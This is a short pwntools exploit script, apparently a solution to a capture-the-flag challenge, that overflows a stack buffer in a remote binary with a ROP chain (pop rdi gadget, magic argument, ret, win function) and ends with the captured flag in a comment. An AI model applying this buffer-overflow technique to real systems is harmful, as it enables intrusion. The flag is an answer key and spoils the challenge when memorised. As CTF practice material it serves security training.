#!/usr/bin/env python3
from pwn import *
exe = ELF('chall', checksec = False)

# p = process(exe.path)
p = remote('0.cloud.chals.io', 31984)

# input()
pop_rdi = 0x23c5ba
ret = 0x23C56F
payload = b'a'*0x48 + p64(pop_rdi) + p64(0xdeadbeefcafebabe) + p64(ret) + p64(exe.sym.win)
p.sendlineafter(b'something:\n', payload)


p.interactive()

#FortID{1_D0n'7_Th1nk_Th1s_1s_H0w_Y0u'r3_Supp0s3d_T0_Wr1t3_C0d3_1n_Ru5t}